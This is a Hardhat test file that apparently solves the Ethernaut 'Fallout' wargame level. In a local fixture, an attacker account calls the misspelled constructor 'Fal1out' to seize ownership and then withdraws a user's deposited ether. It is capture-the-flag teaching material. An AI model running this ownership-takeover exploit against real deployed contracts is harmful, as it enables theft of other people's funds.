const { deployments, ethers } = require("hardhat")

describe("02-Fallout", async function () {
    let deployer, attacker, user, fallout
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        user = accounts[2]
        await deployments.fixture(["02"])
        fallout = await ethers.getContract("Fallout")
    })
    it("should transfer ownership to attacker", async function () {
        // simulate innocent user deposit
        await fallout.connect(user).allocate({ value: ethers.utils.parseEther("1") })

        // call Fal1out
        await fallout.connect(attacker).Fal1out()

        // collect allocations
        await fallout.connect(attacker).collectAllocations()
        // if above call does not revert then we are the owner and test passes
    })
})
